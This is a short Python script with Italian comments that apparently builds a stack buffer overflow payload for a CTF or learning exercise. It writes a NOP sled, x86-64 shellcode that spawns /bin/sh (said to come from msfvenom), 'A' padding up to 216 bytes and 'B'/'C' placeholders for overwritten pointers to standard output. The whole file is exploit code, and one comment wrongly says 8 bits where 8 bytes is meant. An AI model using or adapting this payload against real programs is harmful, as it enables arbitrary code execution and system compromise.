
import sys
import struct

# nop slides, cos√¨ sto sicuro
nop = b"\x90"*8

#generato con msfvenom
shell_code = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

#ora mi riempio di A tranne la lunghezza dello shell code e delle nop
buf = b"A"* (216 - len(nop) - len(shell_code))

#siamo in 64 bit quindi mi servono 8 bit per scrivere un indirizzo
buf += b"B" * 8

buf += b"C" * 8

#mi serve per stampare bytes
sys.stdout.buffer.write(nop + shell_code+buf)